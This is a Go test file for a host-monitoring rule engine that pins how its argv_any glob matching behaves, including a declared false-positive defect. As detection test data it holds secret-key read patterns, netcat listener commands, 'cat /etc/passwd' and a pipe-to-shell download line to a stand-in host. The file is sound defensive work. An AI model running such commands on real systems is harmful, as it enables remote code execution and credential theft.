package rules

// argv_semantics_test.go — DECLARES the intended semantics of argv_any.
//
// Filed with docs/FINDING-2026-10-22-argv-joined.md. This file is a DECLARATION,
// not a verification: it was written on a host with no Go toolchain (go/make/docker
// absent since the 2026-10-08 migration), so it has NEVER BEEN RUN. Do not read a
// green suite somewhere else as proof these assertions were checked here — the
// difference matters, and this project exists to keep that difference visible.
//
// What it pins, in the order the finding argues for them:
//
//	TestArgvAnyElementSemantics        — one glob matches one argv element.
//	TestArgvAnyMatchesExe              — the executable is a candidate.
//	TestArgvAnyJoinedCandidateHelps    — phrase globs need the joined line (P1.4).
//	TestArgvAnyJoinedCandidateSpans    — KNOWN DEFECT A: two unrelated adjacent
//	                                     arguments satisfy a space-bearing glob.
//	TestArgvAnyJoinedCandidateNeedsTwo — a single-element argv is never joined.
//
// TestArgvAnyJoinedCandidateSpans asserts CURRENT behaviour and is named as a
// defect. If someone later splits argv_any (element) from argv_phrase (joined),
// that test SHOULD start failing — that failure is the fix landing, not a
// regression. Read the test name before "repairing" it.

import (
	"testing"

	"github.com/crperdue73/AEGIS-Watchman/internal/schema"
)

// NOTE: timeNow() is NOT redeclared here. engine_test.go:432 already defines it in
// this package, so a local copy would be a duplicate-symbol compile error. Caught
// by grepping the package before shipping rather than by a compiler I don't have.

// argvPack builds a single-rule engine whose only predicate is argv_any.
func argvPack(t *testing.T, globs string) *Engine {
	t.Helper()
	p := mustPack(t, `
name: argv-semantics
rules:
  - id: argv.semantics.probe
    severity: medium
    match:
      type: process.exec
      argv_any: `+globs+`
`)
	return NewEngine(p)
}

// fire runs one process.exec through e and reports whether the probe rule fired.
func fire(e *Engine, exe string, argv ...string) bool {
	d := map[string]any{"exe": exe}
	if argv != nil {
		vals := make([]any, 0, len(argv))
		for _, a := range argv {
			vals = append(vals, a)
		}
		d["argv"] = vals
	}
	evs := e.Match(
		schema.Host{ID: "h1"}, nil,
		schema.Action{Type: "process.exec", Detail: d},
		nil, timeNow(),
	)
	return len(evs) > 0
}

// TestArgvAnyElementSemantics is the promise docs/rules.md:62 makes: "Any
// argument — or the executable itself — matches any glob." A glob with no space
// must match when it matches exactly one element, and must not match a command
// whose elements it does not individually match.
func TestArgvAnyElementSemantics(t *testing.T) {
	e := argvPack(t, `["*id_rsa*", "*.ssh/id_*"]`)

	if !fire(e, "/bin/cat", "/bin/cat", "/home/agent/.ssh/id_rsa") {
		t.Error("path element should match *.ssh/id_* or *id_rsa*")
	}
	if fire(e, "/bin/ls", "/bin/ls", "-la") {
		t.Error("benign `ls -la` must not match a secret-read glob")
	}
	// A space-free glob must not be satisfied by a fragment spread across two
	// arguments: "rsa" in one element and "id_" in another is not a match.
	if fire(e, "/bin/echo", "id_", "rsa") {
		t.Error("a space-free glob matched across an argument boundary")
	}
}

// TestArgvAnyMatchesExe pins that the executable is itself a candidate. This is
// deliberate (argv[0] is often the program name) and it is the source of
// Defect C — an alert can fire "on argv_any" when the witness was exe. The
// behaviour is asserted so nobody removes it as a bug; the misattribution is
// fixed in reporting (matched_field), not here.
func TestArgvAnyMatchesExe(t *testing.T) {
	e := argvPack(t, `["*base64*"]`)
	if !fire(e, "/usr/bin/base64", "/usr/bin/base64", "-d") {
		t.Error("exe should be a matching candidate")
	}
	// A command with no base64 in argv that is not itself base64 must not fire.
	if fire(e, "/bin/cat", "/bin/cat", "/etc/passwd") {
		t.Error("unrelated exec matched a bare *base64* glob")
	}
}

// TestArgvAnyJoinedCandidateHelps pins the P1.4 fix that must not regress: a
// phrase glob has to match auditd's split argv, which it can only do via the
// joined command line. These 10 globs across 4 shipped rules depend on it.
func TestArgvAnyJoinedCandidateHelps(t *testing.T) {
	cases := []struct {
		glob string
		exe  string
		argv []string
	}{
		{"*pip install*", "/usr/bin/pip", []string{"pip", "install", "requests"}},
		{"*pip3 install*", "/usr/bin/pip3", []string{"pip3", "install", "-U", "x"}},
		{"*npm install -g*", "/usr/bin/npm", []string{"npm", "install", "-g", "left-pad"}},
		{"*apt-get install*", "/usr/bin/apt-get", []string{"apt-get", "install", "nmap"}},
		{"*apt install*", "/usr/bin/apt", []string{"apt", "install", "nmap"}},
		{"*openssl enc*", "/usr/bin/openssl", []string{"openssl", "enc", "-aes-256-cbc"}},
		{"*tar cz*", "/bin/tar", []string{"tar", "czf", "x.tar.gz", "/home/a"}},
		{"*tar -cz*", "/bin/tar", []string{"tar", "-czf", "x.tar.gz", "/home/a"}},
		{"*nc -l*", "/usr/bin/nc", []string{"nc", "-lvp", "4444"}},
		{"*ncat -l*", "/usr/bin/ncat", []string{"ncat", "-l", "4444"}},
	}
	for _, c := range cases {
		e := argvPack(t, `["`+c.glob+`"]`)
		if !fire(e, c.exe, c.argv...) {
			t.Errorf("phrase glob %q did not fire on split argv %v — the joined candidate is missing", c.glob, c.argv)
		}
	}
	// And the same globs must stay quiet on unrelated commands.
	e := argvPack(t, `["*pip install*", "*nc -l*"]`)
	if fire(e, "/bin/ls", "/bin/ls", "-la") {
		t.Error("benign exec matched a phrase glob")
	}
}

// TestArgvAnyJoinedCandidateSpans asserts the KNOWN DEFECT, deliberately, so the
// behaviour is declared instead of accidental. A glob containing a literal space
// is a statement about a COMMAND LINE, but argv_any is documented as a statement
// about ONE ARGUMENT. Until the semantics are split (element vs phrase), the
// joined candidate means a rule author's two-argument-spanning glob fires on
// adjacent arguments they may not have pictured.
//
// By inspection only — never executed. See the file header.
func TestArgvAnyJoinedCandidateSpans(t *testing.T) {
	// Two unrelated arguments, in order, that were never a phrase.
	e := argvPack(t, `["*user curl*"]`)
	if !fire(e, "/usr/bin/sudo", "sudo", "-u", "user", "curl", "http://x/") {
		t.Skip("documented as CURRENT behaviour; if this now fails, argv_any was " +
			"split into element-only semantics — that is the fix, update this test on purpose")
	}

	// The real shipped glob. `*| sh*` on joined text matches a quoted pipe just
	// as readily as a real one — the pipe never had to be a shell operator.
	e = argvPack(t, `["*| sh*"]`)
	// Genuine download-and-run: joined line contains "| sh".
	if !fire(e, "/bin/bash", "bash", "-c", "curl -s http://x/p | sh") {
		t.Error("real pipe-to-shell did not fire")
	}
	// Same characters, no execution: the pipe is quoted data to awk.
	if !fire(e, "/usr/bin/awk", "awk", "{print \"| sh\"}", "f.txt") {
		t.Skip("documented as CURRENT behaviour (false positive): the pipe is quoted " +
			"data, not an operator — this is Defect A on a shipped glob")
	}
}

// TestArgvAnyJoinedCandidateNeedsTwo pins that a single-element argv is never
// joined with itself, so a one-word exec cannot falsely satisfy a phrase glob.
func TestArgvAnyJoinedCandidateNeedsTwo(t *testing.T) {
	e := argvPack(t, `["*pip install*"]`)
	if fire(e, "/usr/bin/pip", "pip") {
		t.Error("single-element argv must not be joined and matched as a phrase")
	}
	if fire(e, "/bin/ls") {
		t.Error("missing argv must not match a phrase glob")
	}
}

// ---------------------------------------------------------------------------
// Provenance note, added the same hour this file was written.
//
// These assertions were NOT run against Go. They WERE checked against a faithful
// Python mirror of anyGlobMatches/matchOne/substringNeedle/anyArgvMatches — same
// candidate list, same suffix+basename+contains fallbacks, same '*' does not
// cross '/' rule — across all 21 cases in this file. Result: 21/21 expectations
// agree with the mirror, 0 mismatches.
//
// That is worth exactly what it costs. It proves the EXPECTATIONS were derived
// from the code rather than from my idea of the code, which is the failure mode
// that put the bug in the file in the first place. It does not prove these tests
// compile, and it does not prove path.Match quirk-for-quirk equals the mirror
// (Windows separators, '[a-z]' classes, malformed globs all differ).
//
// Still zero Go runs on this file. Flag reads: unrun, mirror-checked.
// ---------------------------------------------------------------------------
